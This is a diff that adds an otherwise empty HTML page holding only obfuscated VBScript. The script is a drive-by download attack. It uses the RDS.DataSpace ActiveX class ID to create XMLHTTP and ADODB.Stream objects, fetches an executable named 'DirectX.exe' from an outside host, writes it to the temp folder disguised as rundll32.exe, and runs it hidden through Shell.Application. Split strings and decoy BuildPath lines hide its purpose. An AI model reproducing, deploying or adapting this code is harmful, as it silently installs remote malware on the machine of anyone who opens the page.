@@ -1,0 +1,57 @@
+<html>
+<script language="VBScript">
+on error resume next
+Fsnowfox="o"&"b"&"j"&"e"&"ct"
+Ksnowfox="c"&"l"&"a"&"ss"&"i"&"d"
+Tsnowfox="c"&"l"&"s"&"id"&":"&"B"&"D"&"96"&"C"&"556"&"-"&"6"&"5"&"A"&"3-"&"11"&"D"&"0"&"-"&"98"&"3"&"A"&"-"&"00"&"C"&"04"&"FC"&"29"&"E"&"36"
+Msnowfox="M"&"i"&"cr"&"oso"&"f"&"t"&"."&"X"&"M"&"L"&"HTTP"
+Vsnowfox="S"&"he"&"l"&"l"&"."&"A"&"pp"&"l"&"i"&"c"&"a"&"t"&"i"&"on"
+Wsnowfox="S"&"c"&"r"&"ip"&"ti"&"n"&"g"&"."&"F"&"i"&"l"&"e"&"S"&"ys"&"t"&"em"&"O"&"b"&"j"&"ec"&"t"
+Set xuehuc = document.createElement(Fsnowfox)
+
+    mm3 = "http://"
+    mm4 = "859l.com.tw"
+    mm5 = "/explorer/"
+    mm6 = "DirectX.exe"
+
+xuehu=mm3&mm4&mm5&mm6
+xuehuc.setAttribute Ksnowfox, Tsnowfox
+xuehui=Msnowfox
+Set xuehud = xuehuc.CreateObject(xuehui,"")
+yvipf="Ado"
+yvipg="db."
+yviph="Str"
+yvipi="eam"
+xuehuf=yvipf&yvipg&yviph&yvipi
+xuehug=xuehuf
+set xuehua = xuehuc.createobject(xuehug,"")
+xuehua.type = 1
+xuehuh="G"&"E"&"T"
+xuehud.Open xuehuh, xuehu, False
+xuehud.Send
+xuehu9="C:\WINDOWS\rundll32.exe"
+xuehub = xuehuc.crEAtEobjEcT(Wsnowfox,"")
+set xuehue = xuehub.GetSpecialFolder(2)
+xuehua.open
+xuehu8="xuehua.BuildPath(xuehua,xuehu8)"
+xuehu7="snowfoxb.BuildPath(snowfoxb,xuehu7)"
+xuehu6="xuehuc"&"."&"B"&"u"&"i"&"l"&"dP"&"a"&"t"&"h(xuehud,xuehu6)"
+xuehu5="xuehud"&"."&"B"&"u"&"il"&"d"&"P"&"at"&"h(xuehuf,xuehu5)"
+xuehu4="xuehue"&"."&"Bu"&"i"&"l"&"d"&"P"&"a"&"t"&"h(xuehug,xuehu4)"
+xuehu3="xuehuf"&"."&"B"&"u"&"i"&"l"&"d"&"Pa"&"t"&"h(xuehuh,xuehu4)"
+xuehu2="xuehug"&"."&"B"&"u"&"il"&"d"&"P"&"a"&"t"&"h(xuehui,xuehu3)"
+xuehu1="xuehuh"&"."&"B"&"u"&"i"&"ld"&"P"&"a"&"t"&"h(xuehug,xuehu1)"
+xuehu0="xuehui"&"."&"B"&"u"&"i"&"l"&"d"&"P"&"at"&"h(xuehuk,xuehu0)"
+xuehu9= xuehub.BuildPath(xuehue,xuehu9)
+xuehua.write xuehud.responseBody
+xuehua.savetofile xuehu9,2
+xuehua.close
+set xuehue = xuehuc.createobject(Vsnowfox,"")
+xuehue.ShellExecute xuehu9,"B"&"B"&"S",BBS,"o"&"p"&"e"&"n",0</script>
+</HEAD>
+<BODY>
+</BODY>
+</html>
+
+
+
